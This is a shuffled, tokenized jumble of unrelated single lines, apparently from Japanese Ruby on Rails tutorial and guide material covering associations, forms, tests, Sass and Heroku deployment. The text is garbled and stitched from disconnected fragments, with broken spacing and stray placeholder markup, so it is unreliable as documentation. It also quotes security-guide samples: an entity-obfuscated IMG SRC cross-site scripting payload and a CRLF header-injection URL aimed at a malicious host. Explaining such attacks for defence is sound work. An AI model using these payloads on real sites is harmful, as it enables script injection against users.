▁* ▁Rails ▁4▖0 ▁ では ` ActionController :: Base ▖ asset _ path ` オプション が 廃 止 されました 。
▁ ユーザー登録フォーム の CSS
▁ アカウント有効化 の HTML ビュー
▁=> ▁6
▁### ▁ シ リ ア ル 化 属性
▁ここでは 、 Unix コマンド の \ k ode { l s } で \ k ode { app / controllers / } ディレクトリ の 中 身 を表示し た 後 、\ k ode { rm } コマンドを う っかり 実行 して この ディレクトリ を削除し てしまい ました 。
▁作成した コードをリスト \ ref { code : sessions _ helper _ authenticate } に示します
▁ 新しい パスワード 再設定 フォーム は リスト \ ref { code : signin _ form _ redux } と 多くの 共通 点 があります が 、 重要な 違い として 、\ k ode { form _ for } の 呼び出し で使用する リソース と URL が 異 な っている こと と 、 パスワード 属性 が 省略 されている ことが 挙 げ られます 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / numeric / conversions ▖ rb ` です 。
▁CSS ▁( 正確に は SCSS ですが ) ▁ にも ち ょ っ ぴ り 手 を 加えて お き ましょう ▁( リスト \ ref { code : user _ index _ css }) 。
▁ そう ではなく 、( データベース 内で の 計算 は 高 度 に 最適化 され い るので ) ▁ データベースに 代わりに 計算 しても ら い 、 特定の \ k ode { user \_ id } に 紐 付 いた マイクロポストの 数を データベースに 問い合わせ ています 。
▁その 場合 、 アプリケーションコード は 正常に動作し ても テストが 正常に動作し なくなります 。
▁self を省略した 結果を リスト \ ref { code : rspec _ d rb } に示します 。
▁Article ▖ where ( id : ▁10 , ▁ trashed : ▁false )▖ unscope ( where : ▁: id )
▁ アプリケーションに フック する
▁has _ many 関連付けの 図 ]( images / has _ many ▖ png )
▁ もう 1 つの 方法は 、 ユーザー登録 の 項目 に 一意 のユーザー 名を \ emph { 追加 } し 、 @ replies で 使えるように することです 。
▁test : mysql 2
▁# ▁root ▁' welcome # index '
▁{0}{1} 第 8 章 {/1}{/0} の 認 証 ▁( authentication ) ▁ システム を使えば 、\ emph { before _ action } を使用して これを 行えます 。
▁Article ▖ joins (: category , ▁: comments )
▁この節で 定義 する \ k ode { belongs _ to } / \ k ode { has _ many } 関連付け を使用することで 、 表 \ ref { table : association _ methods } に 示す ような メソッドを Rails で 使える ようになります 。
▁ここでは 、 埋め込み Ruby を使って \ k ode { created \_ at } カラム に 明示的に 値を セット し ている点に注目してください 。
▁ただし 現 実 的に は 、\ href { http :// email ▖ about ▖ com / o d / email behind the s c en es / f / email _ case _ s en s ▖ h t m } { about ▖ com } でも 指 摘 されている ように 、 メールアドレス の 大文字 小文字 を 区別 すること を 前 提 に するのは まず い 方法 です ▟ 「 メールアドレス の 大文字 小文字 を 区別 すると 、 果 て しない 混 乱 と 相 互 運 用 性 の 問題 と ひ ど い 頭 痛 が発生する ▟ メールアドレス の 入力 時に 大文字 小文字 の 区別 を要求する のは 賢 い 方法 とは 言 え ない 。
▁(\ k ode { rake ▁ cucumber : o k } と 書く こともできます ) 。
▁ ド ロ ッ プ ダ ウ ン メニュー と 新しい リンク が表示され た ログイン 中の ユーザー
▁# ▁=> ▁< option ▁value ="# { person ▖ id } "> # { person ▖ name } </ option >
▁ 新しい サ ニ タ イ ザ は 、 内部で [ L oo fa h ]( https :// github ▖ com / f la v or j one s / lo of a h ) を使用しています 。
▁ attr _ internal ▁: log _ level
▁@ routes ▁= ▁ Engine ▖ routes
▁\ k ode { box \_ sizing } ミックスイン を リスト \ ref { code : mixin _ and _ debug } から 再 利用 し ていることに注目してください 。
▁ nd er ▁' layouts / rails _ default ' ▁%>╼ ▁<%= ▁render ▁' layouts / shim ' ▁%>╼ ▁</ head >╼ ▁< body >╼ ▁<%= ▁render ▁' layouts / header ' ▁%>╼ ▁< div ▁class =" container "> ╼ ▁<%= ▁yield ▁%>╼ ▁<%= ▁render ▁' layouts / footer ' ▁%>╼ ▁</ div >╼ ▁</ body >╼ </ html >╼ \ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁partials ▁( end )╼╼ ▁% ▁section ▁header _ and _ menu ▁( end )╼╼ ▁\ section { Sass と Asset ▁Pipeline } ▁% ▁( fold )╼ ▁\ label { sec : sass _ and _ the _ asset _ pipeline }╼╼
▁created _ at : ▁nil , ▁updated _ at : ▁nil >
▁ メソッドの 1 行目 では まさに それが 行われ ています ▁( 取り出し たい 属性 は ` params [: article ]` の中に あります ) 。
▁図 \ ref { fig : na ive _ user _ has _ many _ following } の データモデル の 問題 点 は 、 非常に 無 駄 が多い ことです ▟ 各 行 には 、 フォローしているユーザー の id のみ な らず 、 名前 や メールアドレス まで あります ▟ これらは いずれも \ emph { users } テーブルに \ k ode { 既に ある } もの ばかり です 。
▁Heroku では 、 サブドメイン の他に 独自 ドメイン も使用できます
▁X :: Y :: Z ▖ parent _ name ▁# ▁=> ▁" X :: Y "
▁Article ▖ where ( count ry : ▁count ry )
▁index ページの 上 部 には ユーザーの 一覧 が表示されます 。
▁その 次の 行 について説明します 。
▁validates _ with ▁G oodnessValidator
▁ インデックス 名 を変更する ため だけ の マイグレーション は 今後 不要 になりました 。
▁( 完全な 正規表現 )
▁An not at ed ▁ (1) : ▁User
▁ それ に 続 く セクション には 、 サイトの ロゴ を表示する \ k ode { header } 、( \ k ode { div } タグ による ) ▁ いくつかの 領 域 、 ナビゲーション リンク の リスト があります 。
▁create ▁app / views / users / edit ▖ html ▖ erb
▁これで ユーザーの インデックス は 完全に 動く ようになり 、 テスト も 全て {0}{1}{/1}{1}{2} パス {/2} {/1}{1}{/1}{/0} するようになります 。
▁ 一方で 、 リスト \ ref { code : following _ followers _ action s } の いずれ の アクション も 、\ emph { render } を \ k ode { 明示的に } 呼び出し 、\ emph { show _ follow } という 同じ ビューを 出力 しています ▟ したがって 、 作成 が 必要な ビュー は これ 1 つ です 。
▁ 管理者 から 見え る ページを 図 \ ref { fig : index _ delete _ links _ rails _3} に示します 。
▁ 同じ コードを 繰り返す ことは Ruby の 「 DRY 」( Don ' t ▁R epeat ▁Your self : ▁ 繰り返す べ から ず ) ▁という 原 則 に 反 します ▟ この節 では 、 繰り返し を 追 放 して コードを DRY ▁( = よく 乾 か す ) ▁ に しましょう 。
▁< a ▁ href =" http :// rubyonrails ▖ org "> A ▁link </ a >
▁# ▁=> ▁Sun , ▁28 ▁Feb ▁2010 ▁ 23:59:59 ▁+0000
▁use ▁Rack :: Runtime
▁ 今回 取り上げ た Sass の ネスト 機能 や 変数 機能 を使って SCSS ファイルを 全 面 的に 書き 直 す と 、 リスト \ ref { code : refactored _ scss } のようになります 。
▁上のコードは 、 現在のユーザー が 特別な ユーザー の場合 、 その ユーザーが 製 品 ページ を見ると き に 特別な レイアウト を 適用 します 。
▁ --------------- ---------------- ---------------- ---------------- ----------------
▁Date : ▁Sun , ▁24 ▁A ug ▁2014 ▁20 : 28 : 45 ▁GMT
▁これで テストスイート は ▁\ passing ▁ になるはずです 。
▁ Y 1 ▁= ▁: y 1
▁ただし 、 動 画 では 「 15 分 で ブログ を 作る 」 ために \ emph { Scaffold } という お 手 軽 生成 機能 を使っています ▟ Rails の 魔 法 のような \ k ode { generate ▁scaffold } コマンドで \ emph { 自動生成 した コード } がある から こ そ 、 このような 早 業 が 可能な のです 。
▁ スペース を 入 れる と 見 栄 え が 変わる かもしれませんが 、\ ref { sec : testing _ title s } で 触れ た ように HTML は 重複 する 空白 を 無視 する ので どちら でも 大丈夫 です 。
▁この サイトに ログイン するには 、 <%= ▁@ url ▁%> をクリックして ください 。
▁作成した バリデータ が 複 雑 になって インスタンス変数 を使い た く な った 場合は 、 旧 来 の Ruby オブジェクト を簡単に 使う ことができます 。
▁ queue _ as ▁do
▁Rails アプリケーション から 受け取る すべての HTTP レスポンス には 、 以下の セキュリティ ヘッダー が デフォルトで 含まれています 。
▁ 以下のように 、 数値 を 百 分 率 形式 の 文字列に変換 できます 。
▁has _ many ▁: products , ▁ dependent : ▁: destroy
▁# ▁ ページ ご と の 完全な タイトル を返します 。
▁` Rails :: Rack :: Debugger ` は 主 として development 環境で 役に立ちます 。
▁Git ▁ を バージョン管理 に 使 っている 場合は 、 いつものように トピックブランチを作成 しておきましょう 。
▁( なお 、\ k ode { id } パラメータ は Rails によって自動的に \ emph { 主キー } として データベースに 追加される ため 、 追加 不要 です ) 。
▁| ▁| ▁40 9 ▁| ▁: conflict ▁|
▁ パスワード と パスワード 確 認 を追加する ▁( ▁\ passing ▁ )
▁# ▁ SELECT ▁count (* ) ▁AS ▁count _ all ▁FROM ▁clients ▁WHERE ▁( first _ name ▁= ▁' Ryan ')
▁following
▁ カスタム バリデータ は ` validates _ with ` メソッドを使用して 呼び出し ます 。
▁M p ac k は Web ブラウザの セキュリティホール を 介 して 邪悪な ソフトウェア をインストール し よう とします ▟ そして 攻 撃 の 成功 率 は 50 % を 誇 っています 。
▁ 生成された アップ ロー ダ ー の中に コメントアウト された コード があります が 、 ここ の コメントアウト を 取り 消 す ことで 、 画像 の ファイル名 から 有効な 拡張子 ▁( P N G / G I F / J P E G など ) ▁ を検証する ことができます ▁( リスト \ ref { code : validate _ picture _ format }) 。
▁ 本書 は 「\ href { http :// rubyonrails ▖ org /}{ Ruby ▁on ▁Rails } ▁ を使った Web 開発 を 学 び たい の だけ ど 、 何 から 始 め れば 良い でしょうか ? 」 といった 質 問 に 答 え るために 作成 されました 。
▁( この問題 を 指 摘 い ただ いた Jeremy ▁F le is ch man に 感 謝 します ) 。
▁ このため 、 field s _ for は 同じ フォーム に 別の モデルオブジェクト を追加する の に 向 い ています 。
▁\ k ode { rails ▁new } を実行する ▁( バージョン番号 を 指定 ) 。
▁ 特定の 属性 のみ を更新し たい場合は 、 以下のように \ k ode { update _ attribute } を使います ▟ なお 、 update _ attribute には 検証 を 回 避 する といった 効果 もあります 。
▁ 多くの Web サイト は API ▁( Application ▁ Pro gr a m m er ▁Interface ) ▁ を 公開 し ており 、 第 三 者 の アプリケーション から リソース の get / post / put / delete が 行える ようになっています 。
▁この Git ▁configuration で 設定 する 名前 や メールアドレス は 、 今後 リポジトリ 上で 一般に 公開 されます のでご注意ください
▁ Proc ▖ new ▁do ▁| html _ tag , ▁instance |
▁# ▁ それが インクルード されている ▁( article ▖ rb ) ▁ コンテキスト で 評価 する
▁* ▁`: class _ name `
▁DELETE ▁ / articles / : id (▖ : format ) ▁articles # destroy
▁d ▖ end _ of _ year ▁# ▁=> ▁Fri , ▁31 ▁De c ▁2010
▁ここでは 、 Rails の \ emph { console } を使用して 、 ユーザー と マイクロポストの 関連付け を確認する にとどめ ます ▟ Rails の console は 、 Rails アプリケーション を対話的に 操作 する ことができる 便利な ツール です 。
▁{0}{1} リスト 2▖1 {/1}{/0} の内容は {2}{1} リスト 1 ▖ 14 {/1}{/2} と同じ です 。
▁ 追加 の gem を 含 んだ \ k ode { Gemfile } 。
▁ yesterday
▁B E G IN
▁ サーバー側で 考 慮 すべき 点
▁このメソッドは 、 前述の ` ActiveRecord :: Base # invalid ?` メソッドと は 異なります ▟ このメソッドは オブジェクト 全体 の 正 当 性 については 確認し ない ためです 。
▁リスト \ ref { code : email _ downcase } のコードは 、\ k ode { before \_ save } コールバック に ブロック を渡して ユーザーの メールアドレス を設定します ▟ 設定 される メールアドレス は 、 現在の 値を String クラスの \ k ode { downcase } メソッドを使って 小文字 バージョン にした ものです 。
▁ dasherize ? ▁?
▁Rails の ドキュメント を作成する に あたり 、 ユーザー 向 け の パブリックな API と 内部 API の違い を 理解 しておくこと が重要です 。
▁* ▁` ActionDispatch :: ShowExceptions ` は 、 アプリケーション から 返される すべての 例外 を rescue し 、 リクエストが ローカル である か ` config ▖ con side r _ all _ request s _ local ` が ` true ` に設定され ている 場合に 適切な 例外 ページ を出力します 。
▁layout ▁' mailer '
▁ サンプルアプリケーションの コア 部分を 開発 するために 、 これまで に ユーザー 、 セッション 、 アカウント有効化 、 パスワード リ セット という 4 つの リソース について 見 てきました ▟ そして 、 これら のうち 「 ユーザー 」 という リソース だけ が 、 Active ▁Record によって データベース上の テーブル と 紐 付 い ています 。
▁この HTML は以下のような感じ になります 。
▁リスト \ ref { code : login _ form } のコード を使用すると 、 図 \ ref { fig : login _ form } のように ログインフォーム が表示されます
▁if ▁@ article ▖ update ( article _ params )
▁ここで 必要な のは 、\ k ode { microposts } テーブル から 、 ある ユーザー ▁( つまり 自分自身 ) ▁ が フォローしているユーザー に対応する id を持つ マイクロポスト をすべて 選択 ▁( select ) ▁ することです 。
▁\ href { http :// www ▖ rubular ▖ com /}{ Rubular } で 2 〜 3 時間 ほど 遊 んで み てください 。
▁上のコード の 出力 は以下のようになります 。
▁リスト \ ref { code : generating _ pages } のように StaticPages コントローラを生成 すると 、( \ k ode { config / routes ▖ rb }) ファイル が自動的に 更新 されます ▁(\ ref { sec : hello _ world } の ときと同様 です ) 。
▁< ! [ end if ]
▁config ▖ to _ prepare ▁do
▁` years _ since ` も 同じ要領で 、 その 年 数 後 の 同じ 日付 を返します 。
▁ コメント 関連の リクエスト では 、 コメント が 追加される 先 の 記事 が ど れ で あった か を 忘れ ない ように しておく必要があります ▟ そこで 、` Article ` モデルの ` find ` メソッドを 最初に 呼び出し 、 リクエスト で 言 及 されている 記事 ( の オブジェクト ) を取得し て @ article に保存 しています 。
▁* ▁` ActionDispatch :: Re m o te I p ` は IP ス プ ー フ ィ ング 攻 撃 が行われていない かどうかを チェック し 、 リクエスト ヘッダー から 正しい ` client _ ip ` を取得し ます 。
▁ { a : ▁1 } ▖ assert _ valid _ keys (" a ") ▁# ▁ ArgumentError
▁respond _ with ▁@ user
▁ インストール の 際に は 、\ k ode { bundle ▁install } に 特殊な フラグ を追加します 。
▁| ▁| ▁4 08 ▁| ▁: request _ time out ▁|
▁------------ --------------- ----------------
▁d ▖ beginning _ of _ week ▁# ▁=> ▁Mon , ▁0 3 ▁May ▁2010
▁ それ以外の パス が含まれている 場合は 例外が発生します 。
▁リスト \ ref { code : sidebar _ css } では \ k ode { ▖ gravatar _ edit } という CSS クラス を追加 しています ▟ これは {3} {1} 第 9 章 {/1} {/3} でも 使われ ます 。
▁ 配列 の内容を \ emph { 変更 } したい場合は 、 その メソッド に対応する 「 破 壊 的 」 メソッドを使用します ▟ 破 壊 的 メソッド の名前 には 、 元の メソッドの 末尾に 「 !」 を追加した もの を使用する のが Ruby の慣習 です 。
▁* ▁` assert _ routing `
▁ DSL ▁( ドメイン 固 有 言語 ) ▁ である ` shallow ` メソッドを ルーティング で使用する と 、 すべての ネスト が 浅 くなる ように 内 側 に スコープ を 1 つ 作成します 。
▁ ホスト アプリケーション から 見 れば 、 自分 が 持つ スタイルシート に ` " blorgh / admin ▖ css " ` を追加する 意味 はありません 。
▁ 適切な クラス名 と 外部キー と 一 緒 に \ k ode { has \_ many } / \ k ode { has \_ many ▁: through } を使う ことで 、 能動的関係 ▁( フォローする ) ▁ や 受動的関係 ▁( フォロー される ) ▁ が モデリング できた
▁このオプション をオンに すると 、 それらの ファイル 送信 は Web サーバー に 一 任 され 、 それによって 高速 化 されます 。
▁create ▁test / controllers / blorgh / articles _ controller _ test ▖ rb
▁"#{ title } "
▁ conflict ▁config / environment ▖ rb
▁ J o in ▁ Fi lt er : ▁( articles ▖ user _ id ▁= ▁users ▖ id )
▁# ▁< id ▁type =" integer "> 4 3 5 6 </ id >
▁1 人のユーザー には \ k ode { has \_ many } ▁( 1 対 多 ) ▁ の リレーションシップ があり 、 この リレーションシップ は \ emph { 2 人 } の ユーザーの 間 の関係 なので 、 フォローしているユーザー と フォロワー の両方 に 属 します ▁(\ k ode { belongs \_ to }) 。
▁< IM G ▁S R C = & # 1 06 ; & # 9 7 ; & # 1 18 ; & # 9 7 ; & # 1 15 ; & # 99 ; & # 1 14 ; & # 10 5 ; & # 1 12 ; & # 1 16 ; & # 58 ; & # 9 7 ;
▁has _ one ▁: account , ▁ inverse _ of : ▁: supplier
▁NOTE : ▁` has _ many ` 関連付けを 宣言 する 場合 、 相手 の モデル名 は 「 複数形 」 に する必要があります 。
▁#### ▁ サブ セット 条件
▁ここで 扱 う フォーム ヘルパー の 中 心 となる メソッドは form _ for です ▟ このメソッドは モデルのインスタンス から フォーム を作成する ことができます ▟ たとえば 、 以下のように Person という モデル があり 、 この モデルを も と に して インスタンス を 1 つ 作成する とします 。
▁Active ▁Record によって 多数の メソッドが 提供され ているので 、 本書 では 生の SQL を書く 必要がありません ▟ 従って 、 本書 では これ 以降 は SQL コマンド について の 説明 を省略 します 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁ 新しく 動作する Rails アプリ が 完成 した ところで 、 さ っ そ く アプリケーションの ソースコード を \ emph { バージョン管理 } 下 に置き ましょう ▟ これ を行わ ない と アプリケーションが 動かない ということ ではありません が 、 ほとんどの Rails 開発者 は バージョン管理 を 開発 現 場 において 必要 不可 欠 な もの である と 考え ています 。
▁この 機能 が必要な場合は ` actionpack - xml _ parse r ` ▁gem を追加する 必要があります 。
▁# ▁=> ▁< input ▁type =" hidden " ▁id =" user _ token " ▁name =" user [ token ] " ▁value ="# {@ user ▖ token } " ▁/>
▁Ajax を理解する には 、 Web ブラウザの 基本的な 動作 について 理解 しておく必要があります 。
▁Rails の拡張 は自動的に Rails コンソール にも 取り 込 まれ るので 、 以下のように コンソール で 拡張 の 結果を 確 認 できます ▁( 注意 : ▁ 以下のコード は 純 粋 な ▁\ k ode { i rb } ▁ では 動作 しません ) 。
▁( 実際 、 この 有効なメールアドレス のテスト は これまで い つ も パス して きました ▟ 正規表現 の プログラミング は 間 違い が 起こ り やすい ことで 有名な ので 、 ここで 行 な っている 有効なメールアドレス のテスト は 、 主 として \ k ode { VALID _ EMAIL _ REGEX } に対する 形式 的な 健 全 性 チェック に過ぎません ) 。
▁Action ▁View が提供する ヘルパー の概要
▁最初の コードをリスト \ ref { code : failed _ signin _ attempt } に示します ▁( このコード は わざと 少し 間 違 え て あります ) 。
▁これは 、 作成する ときに オプションを 渡す ことで 簡単に カスタマイズ できます 。
▁` exclusion ` ヘルパー の `: in ` オプション には 、 バリデーション を 行った 属性の値 に含め たくない 値 の 集合 を指定します 。
▁ 予 期 し なかった 変更 が発生し た場合 は 、 必ず 差 分 を 十分 に チェック してください 。
▁\ k ode { Gemfile } に Puma を追加する
▁ フォロー / フォロワー ページの 認可 をテストする
▁Users リソース の場合と同様 に 、 Microposts リソース も scaffold で コードを 生成 してみましょう ▟\ k ode { rails ▁generate ▁scaffold } コマンド を使用して 、 {1} {2} 図 2▖ 3 {/2}{/1} の データモデル を実装 してみます
▁ 再度 テスト を実行すると 、 期待どおり 失敗します 。
▁params ▁= ▁ Hash [ * params ▖ map ▁ { | k , ▁ v | ▁[ k , ▁ v ▖ to _ s ]} ▖ f la tt en ]
▁</ div >
▁In ▁Section ▁\ ref { sec : showing _ users }, ▁this ▁page ▁will ▁become ▁the ▁user ’ s ▁profile ▖
▁続いて ` scaffold _ controller ` ジェネレータ が 呼 ば れ 、` Blorgh :: Article sController ` という名前の コントローラを生成 します ▁( 生成 場所 は ` app / controllers / blorgh / articles _ controller ▖ rb ` です )▟ この コントローラ に関連する ビュー は ` app / views / blorgh / articles ` となります 。
▁\ href { https :// twitter ▖ com / col m t uite } { C ol m ▁T uite } の 多 大 な 貢献 により 、 サンプルアプリケーション を Bootstrap ▁CSS の フレームワーク に � 変換 する ことができ ました ▟ 感 謝 します 。
▁ パスワード と パスワード 確 認 に対して 同時に 代入 を しています ▁( この ケース では 、 リスト \ ref { code : length _ validation _ test } と同じように 、 文字列 の 乗 算 を利用して 5 文字 の 文字列を 代入 しています ) 。
▁次に 、 本番 データベース で マイグレーション を実行し 、 Heroku に User データモデル を使用すること を 通知 します 。
▁もし この ステップ が 摩訶 不思議 に 思 え たら 、 次のように 考えてみましょう ▟ 「 私 は ただ \ href { https :// github ▖ com / t w b s / bootstrap - sass # bootstrap - for - sass --- } { bootstrap - sass の README ファイル } に従って い る の だ 」 と 。
▁ 「 forgot ▁password 」 リンク のモックアップ
▁ アプリケーションで 何らかの コードを 、 Rails 自体 が 読み込まれる 前に 実行 する必要が 生じる ことが まれ に あります ▟ その 場合は 、 実行 したい コードを ` config / application ▖ rb ` ファイルの ` require ▁' rails / all ' ` 行 より 前に 書 い てください 。
▁今度は 顧客 を削除する 場合 を 考えてみましょう ▟ 顧客 を削除する なら 、 以下のように 、 顧客 の 注文 も 残 らず 削除され るように して お か なければなりません 。
▁ ブラウザは 、 サーバー から 受け取った レスポンス を 解 析 し 、 続いて 必要な すべての アセット ▁( JavaScript ファイル 、 スタイルシート 、 画像 ) ▁ を サーバー から 取得 します 。
▁| ▁` { ▁" person " : ▁[ null ] ▁}` ▁| ▁` { ▁: person ▁=> ▁nil ▁}` ▁|
▁ ビデオ タグ では 、` id ` や ` class ` などの HTML オプションを 末 尾 で 自由に 指定することもできます 。
▁Rails ▖ application ▖ routes ▖ d raw ▁do
▁ 例 :
▁第 \ ref { cha : rails _ flavored _ ruby } 章 と同じ く 、 Rails コンソール を使用して データモデル を調べ てみましょう 。
▁ 具体的には 、\ href { http :// localhost :3000/ users }{/ users } の index ページを ブラウザで 開 く という 典型的な 操作 を行う ときに 何 が 起こ っている か を MVC ▁( 図 \ ref { fig : mvc _ detailed }) ▁ で説明します 。
▁ 各 フォルダ の イニシャライザ は ア ル フ ァ ベ ッ ト 順に 読み込まれます 。
▁作成した コードをリスト \ ref { code : signin _ after _ signup _ test } に示します
▁Home ページ で使用した の と同じ 方法で 、 Help 、 About 、 Contact ページの テストを 単 純 化 することができます 。
▁リスト \ ref { code : has _ many _ following _ through _ active _ relationships } と 違 って 必要 の ない \ k ode { : source } キー をそのまま 残 している のは 、\ k ode { has _ many ▁: following } と の 類似 性 を 強 調 させるため です 。
▁ 一意性 を強制する と 何 が 起 き る か について 関 心 のある 方は 、\ k ode { db / schema ▖ rb } を開いて み ると 以下のような 行 がある はずです 。
▁╼╼ ▁\ section { セッション } ╼ ▁\ label { sec : sessions _ and _ failed _ login }╼╼
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / access ▖ rb ` です 。
▁M ▖ reachable ?
▁この ` initializer ` メソッドは 3 つの 引数 を 取り ます ▟ 1 番目 は イニシャライザ の名前 、2 番目 は オプション ハッシュ ( 上 の例では 使って ません ) 、 そして 3 番目 は ブロック です 。
▁ とは い う もの の 、 まだ 理解 していない ことが \ emph { 1 つ } あります ▟\ emph { Rails が \ emph { どのように して } これら を 結 び つ け ている か ということです ▟ URL を アクションに マ ッ プ する方法 や 、\ k ode { full \_ title } } ヘルパー を ビューで 利用 できるように する方法 など が そう です 。
▁<%= ▁f ▖ text _ area ▁: text ▁%>
▁それでは 、 Ruby ▁on ▁Rails の 開発環境 を 構 築 し 、 最初の アプリ を作成し てみましょう 。
▁以下の 作業 を行う には 、 メ イン の Rails リポジトリ を指す Git リモート を取得する 必要があります 。
▁NOTE : ▁ ハッシュ による 条件 は 、 等 値 、 範囲 、 サブ セット の チェック で のみ 使用できます 。
▁ //= ▁require ▁ core
▁リスト \ ref { code : minitest _ reporters } のコード には 、 シ ング ル ク オ ー テ ー ション ▁( ') ▁ と ダ ブ ル ク オ ー テ ー ション ▁( ") ▁ の両方 が含まれています 。
▁@ article ▁= ▁Article ▖ new ( params [: article ])
▁wrap _ parameters ▁format : ▁ [: json ]
▁続いて 、` app / views / articles / show ▖ html ▖ erb ` の内容 を以下のように変更し ましょう 。
▁さらに 、 良い テストを書く ことで 、 自 信 を も って \ emph { リファクタリング } を行う ことができます ▟ たとえば 、 フォームの 振る舞い を変更 せずに 、 フォーム 内で 使われ ている 関数 を書き換え たい ときに 有用です 。
▁ セキュリティ には 十分 注意してください ▟ 認可 された ユーザーに のみ API アクセス を 許可 する必要があります 。
▁リスト \ ref { code : password _ migration } では 、\ k ode { add \_ column } メソッドを使って \ k ode { users } テーブル \ k ode { password \_ digest } カラム を追加 しています 。
▁ユーザーの \ k ode { show } ビュー に サイドバー を追加する
▁ 文字列を シ ャ ッ フル する 関数 の 骨 組み 。
▁#### ▁ 単 一 関連付け を結合する
▁* ▁` belongs _ to `
▁上のコード が 動作 するために必要な � パスワード 再設定 用 メイラー メソッドは 、\ ref { sec : account _ activation _ mailer } で開発した アカウント有効化 用 メイラー メソッドと ほぼ 同じです 。
▁ 同じ バリデーション に対して 、`: if ` または `: unless ` のどちら で も使用できます 。
▁I ▁shall ▁be ▁late !" ▖ truncate ( 18 )
▁つまり 、 JavaScript が オフ になっている と ユーザー 削除 のリンク も 無効 になる ということです 。
▁ 現状の サンプルアプリケーション には 、 ユーザーが パスワードを 忘れ てしまった ときの 復 旧 手 段 が ありません 。
▁flash ▖ keys ▁# ▁=> ▁[" string ", ▁" symbol "]
▁ http :// www ▖ your application ▖ com / controller / action ? referer = http :// www ▖ malicious ▖ t ld % 0 d % 0 a X - Head er : + H i !
▁\ k ode { log _ out } メソッドを Sessions コントローラの \ k ode { destroy } アクション で も同様に 使用します ▁( リスト \ ref { code : destroy _ session }) 。
▁cookies ▖ encrypted [: expiration _ date ] ▁= ▁Date ▖ tomorrow ▁# ▁=> ▁Thu , ▁20 ▁Mar ▁2014
▁デフォルトは `: scaffold _ controller ` です 。
▁* ▁[ jquery - ujs ▁ wiki ]( https :// github ▖ com / rails / jquery - ujs / wiki )
▁Help ページ 用に 生成された ビュー
▁これらの ディレクトリ には 、 それぞれの アセット クラス 用の サブディレクトリ があります ▟ たとえば 、 app / assets には 次のような サブディレクトリ があります 。
▁たとえば 、 リスト \ ref { code : typography _ css } や リスト \ ref { code : footer _ css } を見 てみると 、 同じ 色 を 繰り返し 参 照 している 箇所 があります 。
▁# ▁=> ▁< input ▁type =" file " ▁id =" user _ avatar " ▁name =" user [ avatar ] " ▁/>
▁リスト \ ref { code : password _ resets _ resource } のコードは RESTful のルーティング ▁( 表 \ ref { table : RESTful _ password _ resets }) ▁ に従って います 。
▁* ▁` or m ` は 、 使用する ORM ▁( オブジェクト リ レ ー シ ョ ナ ル マッピング ) ▁ を指定します 。
▁\ ref { sec : layout _ link _ tests } でも 指 摘 した ように 、 HTML 構造 を 網羅 的に チェック する テストは 壊 れ や す く 、 生 産 性 を 逆に 落とし か ね ない からです 。
▁Active ▁Record は これらの メソッドを 自動的に 作成し 、 これによって アプリケーションは テーブル に保存 されている データを 操作 することができます 。
▁ 有効なメールアドレス かどうか ( ドット が 2 つ 以上 連続 する かどうか ) を検証する 正規表現
▁ ruby ▁ 2▖0▖ 0 p 3 53
▁ 適切な オプション ▁( `: media `, ▁`: rel ` ) ▁ を使用することで 、 これらの デフォルト値 を上書き できます 。
▁ テストが 緑色 になった ので 、 安 心 して コードを リファクタリング できるようになりました 。
▁この場合 、 関連付け は 次のような 感じ になる でしょう 。
▁=> ▁5 242 88 0
▁ メ イ ル 送信 用の コードの どこか で 、 以下のような 感じ で ロケール 依 存 ビ ッ ト を グループ 化 することができます 。
▁git ▁add : ▁ "▖"
▁次の 章 に進む前に 、 差 分 を コミット して マ ス ター ブランチにマージ しておきましょう 。
▁### ▁ ダイジェスト をオフに する
▁ このため 、`: minimum ` を 1 に設定する のであれば メッセージ を カスタマイズ して 単数形 に するか 、 代りに ` presence : ▁true ` を使用します 。
▁# ▁Active ▁Record の モデルを マスアサインメント から 保 護 するために 例外を発生 する
▁Oh ▁ dear ! ▖▖▖"
▁" :: X "▖ constantize ▁# ▁=> ▁: in _ Object
▁\ ref { sec : a _ working _ sign _ in _ method } で 解説 した ように 、\ k ode { session } メソッドで 保存 した 情報 は自動的に 安全 が 保 た れ ますが 、\ k ode { cookies } メソッド に保存 する 情報 は 残念ながら その ように は な って いません 。
▁@ article ▁= ▁Article ▖ find ( params [: article _ id ])
▁( ブラウザ 上で 画面 を 右 クリック し 、 イン ス ペ ク ター で 要素 を調べる と 確 認 できます ) 。
▁d ▖ next _ week ▁# ▁=> ▁Mon , ▁10 ▁May ▁2010
▁これで 、\ ref { code : user _ follow _ form _ profile _ stats } のように フォロー 用の フォーム を ユーザープロファイルページ に インクルード して パーシャル を 出力 できるようになりました 。
▁( もし \ k ode { www ▖ example ▖ com } などの 独自 ドメイン で SSL を使い たい場合は 、\ href { http :// dev center ▖ heroku ▖ com / articles / ssl } { Heroku ’ s ▁page ▁on ▁SSL } ▁( 英語 ) ▁ の 記事 を参照してください ▟)
▁詳細については 、[ アセットパイプライン ]( asset _ pipeline ▖ html ) ガイド を参照してください 。
▁ただし 、 このように 明示的に 引数 を与え て お け ば 、 コードの 意図 を Rails と 開発者 に 明 確 に 示す ことができます ) 。
▁#### ▁ Builder テンプレート
▁ レイアウト ごとに 異なる 外 観 を設定し て これら を使い 分ける ことができます 。
▁まずは ユーザーが 自分の プロファイル を 自分で 更新 できるようにします ▟ ここで 早速 {0}{1} 第 8 章 {/1}{/0} で実装した 認 証 用の コード を使います が 、 これは 認可 モデル について 説明 する 自然な キ ッ カ ケ になります 。
▁(\ k ode { before } メソッドは 、 別 名 でも ある \ k ode { before (: each )} で 呼 ぶ こともできます ) 。
▁ 削除リンク と ユーザー 削除 に対する 統合テスト
▁[ Rails ▁API ▁ ドキュメント ]( http :// api ▖ rubyonrails ▖ org ) は [ RDoc ]( http :// docs ▖ s eattle rb ▖ org / rdoc / ) を使用して 生成されます 。
▁この 数値 を変更 したい場合は ` state ment _ limit ` に 別の 数値 を指定します 。
▁* ▁: polymorphic
▁ セキュリティ上の 理由 から HTML 以外の テキスト フォーマット 機能 を提供 したい のであれば 、 何らかの マークアップ 言語 を採用し 、 それを サーバー側で HTML に変換 するようにしてください 。
▁### ▁` to _ param `
